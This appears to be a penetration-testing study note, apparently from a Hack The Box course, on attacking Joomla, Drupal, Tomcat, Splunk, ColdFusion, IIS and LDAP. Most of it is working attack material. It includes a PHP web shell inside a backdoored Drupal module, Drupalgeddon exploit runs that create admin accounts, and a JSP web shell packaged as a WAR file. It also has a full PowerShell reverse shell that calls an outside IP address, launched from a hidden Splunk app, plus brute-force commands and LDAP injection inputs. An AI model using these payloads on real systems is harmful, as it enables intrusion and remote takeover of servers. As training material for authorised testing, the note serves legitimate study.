# Attacking Common Applications
- [Joomla](#joomla)
  - [Enumeration](#enumeration)
- [Drupal](#drupal)
  - [Enumeration](#enumeration-1)
  - [PHP Filter Module](#php-filter-module)
  - [Uploading a Backdoored Module](#uploading-a-backdoored-module)
  - [Drupalgeddon](#drupalgeddon)
- [Tomcat](#tomcat)
  - [Enumeration](#enumeration-2)
  - [WAR File Upload](#war-file-upload)
- [Splunk](#splunk)
  - [Abusing Built-In Functionality](#abusing-built-in-functionality)
- [ColdFusion](#coldfusion)
- [IIS Tilde Enumeration](#iis-tilde-enumeration)
- [LDAP](#ldap)
  - [LDAP Injection](#ldap-injection)


## Joomla
### Enumeration
- Fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
- The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`

- [Droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```
- We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan). However, JoomlaScan is a bit out-of-date and requires Python2.7 to run.
```bash
abdeonix@htb[/htb]$ curl https://pyenv.run | bash
abdeonix@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
abdeonix@htb[/htb]$ source ~/.bashrc
abdeonix@htb[/htb]$ pyenv install 2.7
abdeonix@htb[/htb]$ pyenv shell 2.7

abdeonix@htb[/htb]$ python2.7 -m pip install urllib3
abdeonix@htb[/htb]$ python2.7 -m pip install certifi
abdeonix@htb[/htb]$ python2.7 -m pip install bs4

python2.7 joomlascan.py -u http://dev.inlanefreight.local


## bruteforcing default password using Joomla [bruteforce](https://github.com/ajnik/joomla-bruteforce)
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Drupal
### Enumeration
- We can identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. 
- The page URIs are usually of the form `/node/<nodeid>`
- Version
```bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 

## Droopescan 
droopescan scan drupal -u http://drupal.inlanefreight.local
```
### PHP Filter Module
- In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated."

![Drupal_PHP_Module](/images/drupal_php_module.png)

- From here, we could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.

![Basic_Page](/images/basic_page.png)

- We can now create a page with a malicious PHP snippet such as the one below.

![Basic_page_shell](/images/basic_page_shell_7v2.png)

- We also want to make sure to set Text format drop-down to PHP code. From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves
```bash
abdeonix@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- Once downloaded go to `Administration > Reports > Available updates`

> [!NOTE]
> Location may differ based on the Drupal version and may be under the Extend menu.

![Install_Module](/images/install_module.png)

- From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.
- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

### Uploading a Backdoored Module
- Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
- Modules can be found on the drupal.org website.
```bash
# Download the archive and extract its contents.
abdeonix@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
abdeonix@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```
- Create a PHP web shell with the contents:

```php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```bash
abdeonix@htb[/htb]$ mv shell.php .htaccess captcha
abdeonix@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```
- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. 
- Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.

![Module_Installed](/images/module_installed.png)

- Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
```bash
abdeonix@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Drupalgeddon
- CVE-2014-3704, known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- This is [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```bash
abdeonix@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

- **Drupalgeddon2**
- We can use this [PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability.
```bash
abdeonix@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```
- We can check quickly with `cURL` and see that the hello.txt file was indeed uploaded.
```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

- Modify the script to gain remote code execution by uploading a malicious PHP file.

## Tomcat
### Enumeration
- This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
- Each folder inside webapps is expected to have the following structure:
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```
- The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes
- All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information.
- The `jsp` folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.
- Here’s an example web.xml file:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```
- The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```
- The file shows us what each of the roles manager-gui, manager-script, manager-jmx, and manager-status provide access to. In this example, we can see that a user tomcat with the password tomcat has the manager-gui role, and a second weak password admin is set for the user account admin

### WAR File Upload
- The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive:
```bash
abdeonix@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
abdeonix@htb[/htb]$ zip -r backup.war cmd.jsp 

```
- Click on Browse to select the .war file and then click on Deploy.
![Mgr_Deploy](/images/mgr_deploy.png)
- This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
![WAR_Deployed](/images/war_deployed.png)
```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

## Splunk 
- Splunk is a log analytics tool used to gather, analyze and visualize data. 
- Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.
- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`

### Abusing Built-In Functionality
- We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The bin directory in this repo has examples for Python and PowerShell. Let's walk through this step-by-step.

- The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our inputs.conf file. Our reverse shell will be a PowerShell one-liner.
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- The inputs.conf file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```cmd
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
- Once the files are created, we can create a tarball or `.spl` file.
```bash
abdeonix@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf

```
- The next step is to choose `Install app from file` and upload the application.
![Install_app](/images/install_app.png)
- Before uploading the malicious custom app, let's start a listener using Netcat or socat.

- On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.
![Upload_app](/images/upload_app.png)
- As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to Enabled.

> ![NOTE]
> If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

> ![!TIP]
> - If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. 
> - In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

## ColdFusion
- ColdFusion is a programming language and a web application development platform based on Java.
- It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. 
- ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications.
- For instance, the `cfquery` tag can execute SQL statements to retrieve data from a database:
```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```
- Developers can then use the `cfloop` tag to iterate through the records retrieved from the database:
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
- ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.

### Enumeration
- ColdFusion pages typically use "`.cfm`" or "`.cfc`" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.
- ColdFusion typically sets specific headers, such as "`Server: ColdFusion`" or "`X-Powered-By: ColdFusion`", that can help identify the technology being used.
- ColdFusion creates several default files during installation, such as "`admin.cfm`" or "`CFIDE/administrator/index.cfm`". Finding these files on the web server may indicate that the web application runs on ColdFusion.

## IIS Tilde Enumeration
- [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP



egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

```
## LDAP
- LDAP works by using a client-server architecture. A client sends an LDAP request to a server, which searches the directory service and returns a response to the client.
-  LDAP supports various requests, such as bind, unbind, search, compare, add, delete, modify, etc.
- LDAP requests are messages that clients send to servers to perform operations on data stored in a directory service. An LDAP request is comprised of several components:

  1. Session connection: The client connects to the server via an LDAP port (usually 389 or 636).
  2. Request type: The client specifies the operation it wants to perform, such as bind, search, etc.
  3. Request parameters: The client provides additional information for the request, such as the distinguished name (DN) of the entry to be accessed or modified, the scope and filter of the search query, the attributes and values to be added or changed, etc.
  4. Request ID: The client assigns a unique identifier for each request to match it with the corresponding response from the server
- Once the server receives the request, it processes it and sends back a response message that includes several components:

  1. Response type: The server indicates the operation that was performed in response to the request.
  2. Result code: The server indicates whether or not the operation was successful and why.
  3. Matched DN: If applicable, the server returns the DN of the closest existing entry that matches the request.
  4. Referral: The server returns a URL of another server that may have more information about the request, if applicable.
  5. Response data: The server returns any additional data related to the response, such as the attributes and values of an entry that was searched or modified.

- **ldapsearch**
  - For example, ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
```bash
abdeonix@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

# This command can be broken down as follows:

# 1. Connect to the server ldap.example.com on port 389.
# 2. Bind (authenticate) as cn=admin,dc=example,dc=com with password secret123.
# 3. Search under the base DN ou=people,dc=example,dc=com.
# 4. Use the filter (mail=john.doe@example.com) to find entries that have this email address.
```

- The server would process the request and send back a response, which might look something like this:

```bash
dn: uid=jdoe,ou=people,dc=example,dc=com
objectClass: inetOrgPerson
objectClass: organizationalPerson
objectClass: person
objectClass: top
cn: John Doe
sn: Doe
uid: jdoe
mail: john.doe@example.com

result: 0 Success
```

### LDAP Injection

|Input|	Description|
|:----|:-----------|
|`*`|	An asterisk * can match any number of characters.|
|`( )`|	Parentheses ( ) can group expressions.|
|`\|`|	A vertical bar | can perform logical OR.|
|`&`|	An ampersand & can perform logical AND.|
|`(cn=*)`|	Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, `(cn=*) or (objectClass=*)` can be used as input values for a username or password fields.|

- LDAP injection attacks are similar to SQL injection attacks but target the LDAP directory service instead of a database.

